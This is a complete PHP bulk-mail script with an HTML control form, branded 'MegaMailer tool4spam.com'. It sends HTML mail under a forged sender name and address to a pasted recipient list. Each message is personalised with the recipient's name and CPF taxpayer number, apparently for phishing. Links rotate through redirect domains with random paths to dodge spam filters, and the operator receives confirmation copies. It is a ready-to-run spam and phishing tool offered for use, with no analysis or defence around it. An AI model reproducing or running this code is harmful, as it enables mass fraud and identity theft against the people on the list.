<?php
if ($_POST["enviar"]){
$opcao_mailer = $_POST["radiobutton"];
$realname = $_POST['realname'];
$from = $_POST['from'];
$subject = $_POST['subject'];
$message = stripslashes($_POST['message']);
$emails = $_POST['emaillist'];
$emails_lista = explode("\n", $emails);
$quant_emails = count($emails_lista);
$redirectlist = array_unique(explode("\n",$_POST['redirectlist']));

if ($opcao_mailer == "sendmail"){$tipo_mailer = "sendmail";}
if ($opcao_mailer == "mail"){$tipo_mailer = "mail";}
if ($opcao_mailer == "smtp"){$tipo_mailer = "smtp";}


require("class.phpmailer.php");
$mail = new phpmailer();

$mail->From     = "$from";
$mail->FromName = "$realname";
$mail->Host     = "localhost";
$mail->Mailer   = $tipo_mailer;
$mail->IsHTML(true);
$confirmail1 = $_POST['confirmail1'];
$confirmail2 = $_POST['confirmail2'];
$domain = $_SERVER['HTTP_HOST'];
 
$redi = 0;
$countred = count($redirectlist);
 
for($x = 0; $x < $quant_emails; $x++){
	if($redi >= $countred)
	$redi = 0;

	$nun_mail++;
	
	$redirect = $redirectlist[$redi].'/'.md5(rand(0,99999)+rand(0,9999));
	
	$num1 = rand(100000,999999);
	$num2 = rand(100000,999999);
	$aux = explode(';',$emails_lista[$x]);
	$msgrand = str_replace("%rand%", $num1, $message);
	$msgrand = str_replace("%rand2%", $num2, $msgrand);
	$msgrand = str_replace("%email%", $aux[0], $msgrand); 
	$msgrand = str_replace("%realname%", $aux[1], $msgrand);
	$msgrand = str_replace("%cpf%", $aux[2], $msgrand);
	
	$msgrand = str_replace("[red]", $redirect, $msgrand);
	
	$assrand = str_replace("%realname%", $aux[1], $subject);
	$assrand = str_replace("%cpf%", $aux[2], $assrand);
	$mail->Body     = $msgrand;
	$mail->Subject  = "$assrand";
	$mail->AddAddress(trim($aux[0]), trim($aux[1]));
	if(!$mail->Send())
	{
	   echo '<font size="1">' . $nun_mail . '&nbsp;ERRO:&nbsp;' . $emails_lista[$x] . '&nbsp;' . $mail->ErrorInfo . '</font><br>';
	   flush(); 
	}
	else {
	echo '<font size="1">' . $nun_mail . '&nbsp;OK:&nbsp;' . $emails_lista[$x] . '</font><br>';
		 flush();
	}
	$mail->ClearAddresses();
	$redi++;
}
$mail->AddAddress($confirmail1, $domain);
if(!$mail->Send())
{
   echo '<font size="1">' . $nun_mail . '&nbsp;Erro Confirm:&nbsp;' . $confirmail1 . '&nbsp;' . $mail->ErrorInfo . '</font><br>';
   flush(); 
}
else {
echo '<font size="1">' . $nun_mail . '&nbsp;OK Confirm:&nbsp;' . $confirmail1 . '</font><br>';
     flush();
}
$mail->ClearAddresses();
$mail->AddAddress($confirmail2, $domain);
if(!$mail->Send())
{
   echo '<font size="1">' . $nun_mail . '&nbsp;Erro Confirm:&nbsp;' . $confirmail2 . '&nbsp;' . $mail->ErrorInfo . '</font><br>';
   flush(); 
}
else {
echo '<font size="1">' . $nun_mail . '&nbsp;OK Confirm:&nbsp;' . $confirmail2 . '</font><br>';
     flush();
}
$mail->ClearAddresses();
}

?>
<message>
<head>
<style type="text/css">
<!--
.style1 {font-size: 10px}
body,td,th {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 12px;
	color: #999999;
}
body {
	background-color: #000000;
}
#enviar {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	background-color: #003366;
	color: #D4D0C8;
	font-weight: normal;
	border-top-style: double;
	border-right-style: double;
	border-bottom-style: double;
	border-left-style: double;
	font-size: 10px;
}
#emails {
}
.style2 {font-size: 9px; }
-->
</style>
<title>MegaMailer tool4spam.com</title></head>
<body>

  <tr>
    <td width="368" height="346" align="center"><p>&nbsp;</p>
    <form name="form1" method="post" action="">
      <table width="324" border="0" align="center" bordercolor="#003300">
        <tr>
          <td colspan="2" rowspan="3" valign="top" bgcolor="#550000"><p>
            <input name="from" type="text" id="from" value="" size="20">
            <b>Name  : </b>
            <input name="realname" type="text" id="realname" value="" size="20">
          </p>
          <p>
            <input name="replyto" type="text" id="replyto" value="" size="20">
          </p></td>
          <td align="center" bgcolor="#550000"><span class="style1"><strong>SMTP</strong></span></td>
          <td align="center" bgcolor="#003366"><span class="style1"><strong><strong>
            <input name="radiobutton" type="radio" value="smtp" checked="CHECKED">
          </strong></strong></span></td>
        </tr>
        <tr>
          <td align="center" bgcolor="#550000"><span class="style1"><strong><strong><strong>MAIL</strong></strong></strong></span></td>
          <td align="center" bgcolor="#003366"><span class="style1"><strong><strong><strong>
            <input name="radiobutton" type="radio" value="mail">
          </strong></strong></strong></span></td>
        </tr>
        <tr>
          <td align="center" bgcolor="#550000"><span class="style1"><strong><strong>MAILER</strong></strong></span></td>
          <td align="center" bgcolor="#003366"><span class="style1"><strong><strong>
            <input name="radiobutton" type="radio" value="sendmail">
          </strong></strong></span></td>
        </tr>
        <tr>
          <td width="160" align="left" bgcolor="#550000">&nbsp;</td>
          <td colspan="3" align="left" bgcolor="#550000">&nbsp;</td>
        </tr>
        <tr>
          <td align="left" bgcolor="#550000"><b>Subject</b><input name="subject" type="text" id="subject" value="" size="50"></td>
          <td colspan="3" align="center" bgcolor="#550000">&nbsp;</td>
        </tr>
        <tr>
          <td align="center" bgcolor="#550000"><b>Letter HTML</b><textarea name="message" cols="50" rows="20" id="message"></textarea></td>
          <td colspan="3" align="center" bgcolor="#550000"><b>Mail List</b><textarea name="emaillist" cols="30" rows="20" id="emaillist"></textarea></td>
        </tr>
        <tr>
          <td colspan="4" align="center" bgcolor="#550000"><b>Redirection List</b><textarea name="redirectlist" cols="30" rows="20" id="redirectlist"></textarea></td>
        </tr>
        <tr>
          <td colspan="4" align="center" bgcolor="#550000"><input name="enviar" type="submit" id="enviar" value="Send Message"></td>
        </tr>
      </table>
    </form>    <p>&nbsp;</p></td>
  </tr>
</table>
<p>&nbsp;</p>
</body>
</message
><?php

//@ignore_user_abort(TRUE);
//error_reporting(0);
//@set_time_limit(0);
//ini_set("memory_limit","-1");


?>